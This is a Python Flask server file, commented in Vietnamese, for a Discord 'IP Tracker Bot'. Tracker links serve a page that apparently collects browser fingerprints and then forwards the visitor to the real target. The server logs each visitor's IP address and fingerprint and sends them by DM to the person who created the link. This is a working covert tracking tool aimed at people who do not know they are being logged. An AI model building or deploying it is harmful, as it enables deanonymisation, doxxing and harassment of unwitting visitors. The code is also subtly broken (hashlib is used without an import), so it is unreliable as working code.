# app/server.py
from flask import Flask, request, render_template, redirect, url_for, abort, jsonify
from threading import Thread
import discord
import os
from . import database as db

# Khởi tạo Flask App
app = Flask(__name__, template_folder='templates')
bot_instance = None # Biến để lưu trữ instance của bot

# Hàm này sẽ được gọi từ main.py để nhận instance của bot
def set_bot_instance(bot):
    global bot_instance
    bot_instance = bot

async def send_dm_notification(creator_id: int, log_data: dict):
    """Gửi tin nhắn DM chứa thông tin log đến người tạo tracker."""
    try:
        user = await bot_instance.fetch_user(creator_id)
        if not user:
            print(f"Không thể tìm thấy user với ID: {creator_id}")
            return

        embed = discord.Embed(
            title="🎯 Đã có người truy cập vào link của bạn!",
            description=f"Một truy cập mới vừa được ghi nhận.",
            color=discord.Color.brand_green()
        )
        embed.add_field(name="👤 Visitor ID", value=f"`{log_data['visitor_id']}`", inline=False)
        embed.add_field(name="🌐 Địa chỉ IP", value=f"`{log_data['ip']}`", inline=False)
        
        fingerprint_text = log_data.get('fingerprint', 'Không thể lấy thông tin.')
        if len(fingerprint_text) > 1024:
            fingerprint_text = fingerprint_text[:1020] + "..."

        embed.add_field(name="🔍 Browser Fingerprint", value=f"```\n{fingerprint_text}\n```", inline=False)
        embed.set_footer(text=f"Tracker ID: {log_data['tracker_id']}")
        embed.timestamp = discord.utils.utcnow()

        await user.send(embed=embed)

    except discord.Forbidden:
        print(f"Không thể gửi DM cho {user.name} (ID: {creator_id}). Người dùng đã chặn bot hoặc khóa DM.")
    except Exception as e:
        print(f"Lỗi khi gửi DM: {e}")

@app.route('/')
def home():
    return "IP Tracker Bot is running."

@app.route('/track/<tracker_id>')
def track_link(tracker_id: str):
    """Endpoint mà người dùng sẽ truy cập."""
    tracker = db.get_tracker_by_id(tracker_id)
    if not tracker:
        abort(404, "Link không tồn tại hoặc đã hết hạn.")
    
    # Render trang HTML chứa mã JS, truyền các biến cần thiết vào
    return render_template(
        'tracker.html',
        target_url=tracker['target_url'],
        log_url=url_for('log_visit', tracker_id=tracker_id, _external=True)
    )

@app.route('/log/<tracker_id>', methods=['POST'])
def log_visit(tracker_id: str):
    """Endpoint nhận dữ liệu fingerprint từ JS."""
    tracker = db.get_tracker_by_id(tracker_id)
    if not tracker:
        return jsonify({"status": "error", "message": "Tracker not found"}), 404

    # Lấy IP chính xác, ưu tiên header của proxy (Render, Heroku, etc.)
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr

    fingerprint_data = request.json
    
    # Lưu log vào DB
    db.add_log(tracker_id, ip, fingerprint_data)

    # Gửi thông báo DM cho người tạo tracker
    if bot_instance:
        log_for_dm = {
            "tracker_id": tracker_id,
            "visitor_id": hashlib.md5(f"{ip}-{fingerprint_data.get('visitorId', 'unknown')}".encode()).hexdigest()[:12],
            "ip": ip,
            "fingerprint": "\n".join([f"{k}: {v}" for k, v in fingerprint_data.items()])
        }
        
        # Lên lịch chạy coroutine trên event loop của bot một cách an toàn từ thread
        bot_instance.loop.call_soon_threadsafe(
            bot_instance.loop.create_task, 
            send_dm_notification(tracker['creator_id'], log_for_dm)
        )

    return jsonify({"status": "ok"})


def run_server():
  app.run(host='0.0.0.0', port=8080)

def start_web_server(bot):
    """Khởi động web server trong một thread riêng."""
    set_bot_instance(bot)
    server_thread = Thread(target=run_server)
    server_thread.daemon = True # Thread sẽ tự tắt khi chương trình chính kết thúc
    server_thread.start()
    print("🚀 Web Server đã được khởi động.")
